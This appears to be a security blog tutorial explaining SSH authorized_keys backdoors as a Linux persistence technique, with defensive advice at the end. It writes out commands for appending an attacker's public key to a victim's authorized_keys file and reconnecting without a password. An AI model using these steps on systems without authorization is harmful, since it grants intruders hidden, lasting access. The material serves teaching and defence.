---
title : "Linux Backdoors"
date : 2025-07-10
layout : post
categories : [BACKDOOR]
tags : [SSH, BACKDOOR, PERSISTENCE, LINUX]
author : jana
---

# SSH Backdoors: Persistence Through Authorized Keys

Hello security pros! 👋  

Welcome back to another dive into **Linux persistence mechanisms attackers love**.  
Today, we’re looking at one of the most common — yet often overlooked — techniques: the **SSH authorized_keys backdoor**.  

It’s clean, reliable, and doesn’t rely on exploiting binaries or injecting shell tricks. Instead, it abuses a feature meant for convenience: **public key authentication**.  

---

## 🔍 What Is an SSH Backdoor?

An **SSH backdoor** leverages the SSH key-based authentication system to maintain persistence on a compromised Linux host.  

Instead of needing a password, the attacker adds their own **public key** into the victim’s `~/.ssh/authorized_keys` file.  

Result? The attacker can log back in anytime using their **private key**, bypassing password authentication and blending in as a “legit” user.  

---

## 🧠 How Authorized Keys Work  

- Users store trusted public keys in `~/.ssh/authorized_keys`  
- If a connecting client proves ownership of the matching private key, login is granted  
- No password is required  
- This is a normal feature — but if abused, it becomes a stealthy persistence mechanism  

---

## 🧰 The Attack: Step-by-Step  

### ✅ Step 1: Initial Access  
The attacker compromises the system (via exploit, weak creds, phishing, etc.).  

### ✅ Step 2: Key Setup  
On their own machine, the attacker generates a key pair:  

\`\`\`bash
ssh-keygen -t rsa -b 4096
\`\`\`

This produces:  
- Private key: `~/.ssh/id_rsa`  
- Public key: `~/.ssh/id_rsa.pub`  

### ✅ Step 3: Plant the Backdoor  
The attacker appends their public key to the victim’s authorized_keys file:  

\`\`\`bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> /home/alice/.ssh/authorized_keys
\`\`\`

Now Alice’s account trusts the attacker’s key.  

### ✅ Step 4: Silent Re-Entry  
From then on, the attacker can connect like so:  

\`\`\`bash
ssh -i ~/.ssh/id_rsa alice@victim_ip
\`\`\`

No password prompt. Instant persistence.  

---

## 🔁 Attack Flow Recap  

| Step              | Action                                           |
|-------------------|-------------------------------------------------|
| 🎯 Initial Access | Attacker compromises system                     |
| 🔑 Key Pair Gen   | Attacker creates SSH key pair                   |
| 📝 Key Injection  | Public key added to victim’s authorized_keys    |
| 🚪 Backdoor Entry | Attacker logs in anytime using private key      |

---

## 🕵️ Why It’s Sneaky  

✅ Uses a legitimate SSH feature  
✅ Doesn’t require root (user-level persistence works fine)  
✅ Blends with real admin/dev usage  
✅ Survives reboots and logouts  
✅ Password changes don’t matter — key still works  

This makes it a favorite among attackers and red teamers alike.  

---

## 🧪 Lab Example (Safe Demo)  

**On attacker machine:**  
\`\`\`bash
ssh-keygen -t rsa -b 2048
\`\`\`

**On target machine:**  
\`\`\`bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-rsa AAAAB3Nza..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
\`\`\`

**Test the backdoor:**  
\`\`\`bash
ssh -i ~/.ssh/id_rsa user@victim_ip
\`\`\`

➡️ Instant login without password.  

---

## ⚠️ Limitations  

- ❌ Limited to SSH access (no shell execution if SSH is disabled)  
- ❌ Easy to spot if defenders audit authorized_keys  
- ❌ Requires attacker to manage their private key securely  
- ❌ Can be blocked by central key management or strict configs  

---

## 🛡️ Defense Strategies  

- **Audit SSH Keys:**  
  Regularly inspect `~/.ssh/authorized_keys` for unexpected entries  
  Enforce centralized key management  

- **Restrict Access:**  
  Disable password-less logins where possible  
  Enforce MFA for SSH access  

- **Monitor SSH Logins:**  
  Track unusual logins or new SSH key usage  
  Alert on logins from strange IPs or odd times  

- **File Integrity Monitoring:**  
  Use AIDE, Tripwire, or auditd to detect changes in `~/.ssh/authorized_keys`  

---

## 🧠 Final Thoughts  

SSH backdoors are one of the **cleanest persistence methods** attackers use. They rely on nothing but native functionality, making them stealthy and reliable.  

- For red teamers: it’s a straightforward persistence trick.  
- For blue teamers: it’s a reminder that **authorized_keys is a high-value file**.  
- For learners: it’s a perfect example of how normal features can be weaponized.  

---

⚠️ **Disclaimer:** This post is for **educational purposes only**. Do not test these techniques on systems you do not own or without explicit permission.  

Stay sharp, monitor your keys, and never assume SSH is “just working fine.” 😉  
